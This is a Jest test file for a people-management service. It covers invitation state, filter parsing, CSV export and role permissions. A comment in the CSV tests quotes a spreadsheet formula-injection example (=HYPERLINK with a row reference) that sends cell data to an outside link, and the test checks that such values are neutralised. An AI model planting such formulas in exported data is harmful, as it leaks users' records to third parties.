/** @jest-environment node */
/**
 * Tests for the pure helpers behind /personas.
 * SSOT: plan/06-cohortes-y-personas.md:31-37, docs/estado.md §12a
 */

jest.mock('server-only', () => ({}));
jest.mock('@/lib/db/tenant', () => ({ createTenantClient: jest.fn() }));

import {
  deriveInvitationState,
  parsePeopleFilters,
  toCsv,
  roleChangeNeedsInstitutionManage,
} from '@/features/people/server/people.service';

const NOW = new Date('2026-09-17T12:00:00.000Z');
const FUTURE = new Date('2026-09-24T12:00:00.000Z');
const PAST = new Date('2026-09-10T12:00:00.000Z');

describe('deriveInvitationState', () => {
  it('is "none" with no invitations at all', () => {
    expect(deriveInvitationState([], NOW)).toBe('none');
  });

  it('is "accepted" as soon as one was accepted, even if a newer one expired', () => {
    expect(
      deriveInvitationState(
        [
          { acceptedAt: PAST, expiresAt: PAST },
          { acceptedAt: null, expiresAt: PAST },
        ],
        NOW
      )
    ).toBe('accepted');
  });

  it('is "pending" while a token is still alive', () => {
    expect(deriveInvitationState([{ acceptedAt: null, expiresAt: FUTURE }], NOW)).toBe('pending');
  });

  it('is "expired" when every token is past its date and none was accepted', () => {
    expect(deriveInvitationState([{ acceptedAt: null, expiresAt: PAST }], NOW)).toBe('expired');
  });

  it('prefers the live token when one expired and another has not', () => {
    expect(
      deriveInvitationState(
        [
          { acceptedAt: null, expiresAt: PAST },
          { acceptedAt: null, expiresAt: FUTURE },
        ],
        NOW
      )
    ).toBe('pending');
  });
});

describe('parsePeopleFilters', () => {
  it('reads the three filters, the page, the sort and the page size', () => {
    expect(
      parsePeopleFilters({
        q: ' ana ',
        rol: 'student',
        invitacion: 'pending',
        pagina: '3',
        orden: 'reciente',
        mostrar: '20',
      })
    ).toEqual({
      q: 'ana',
      role: 'STUDENT',
      invitation: 'pending',
      page: 3,
      sort: 'reciente',
      pageSize: 20,
    });
  });

  it('falls back to name order and 50 per page for unknown values (19/9)', () => {
    const filters = parsePeopleFilters({ orden: 'azar', mostrar: '7' });
    expect(filters.sort).toBe('nombre');
    expect(filters.pageSize).toBe(50);
  });

  it('drops values that are not real roles or states instead of failing', () => {
    expect(parsePeopleFilters({ rol: 'DIRECTOR', invitacion: 'quizás' })).toEqual({
      q: '',
      role: null,
      invitation: null,
      page: 1,
      sort: 'nombre',
      pageSize: 50,
    });
  });

  it('falls back to page 1 for anything that is not a page above 1', () => {
    for (const pagina of ['0', '-4', 'abc', '', '1']) {
      expect(parsePeopleFilters({ pagina }).page).toBe(1);
    }
  });

  it('takes the first value when a param repeats', () => {
    expect(parsePeopleFilters({ q: ['ana', 'otro'] }).q).toBe('ana');
  });

  it('caps the search text so the query cannot be stuffed', () => {
    expect(parsePeopleFilters({ q: 'a'.repeat(500) }).q).toHaveLength(120);
  });
});

describe('toCsv', () => {
  it('quotes values with commas, quotes or newlines', () => {
    expect(
      toCsv(
        ['a', 'b'],
        [
          ['con,coma', 'con"comilla'],
          ['con\nsalto', 'normal'],
        ]
      )
    ).toBe('a,b\r\n"con,coma","con""comilla"\r\n"con\nsalto",normal');
  });

  it('neutralises values a spreadsheet would run as a formula', () => {
    // =, +, - and @ at the start are executed by Excel and Sheets: a cell like
    // =HYPERLINK("http://…"&A1) exfiltrates the row. Prefixing with ' makes it text.
    const csv = toCsv(['x'], [['=1+1']]);
    expect(csv).toBe("x\r\n'=1+1");
  });

  it('leaves ordinary values untouched', () => {
    expect(toCsv(['x'], [['ana maría']])).toBe('x\r\nana maría');
  });
});

describe('roleChangeNeedsInstitutionManage', () => {
  it('singles out ADMIN', () => {
    expect(roleChangeNeedsInstitutionManage('ADMIN')).toBe(true);
  });

  it('leaves every other role to people.manage', () => {
    for (const role of ['OPERATIONS', 'INSTRUCTOR', 'STUDENT', 'GUARDIAN'] as const) {
      expect(roleChangeNeedsInstitutionManage(role)).toBe(false);
    }
  });
});
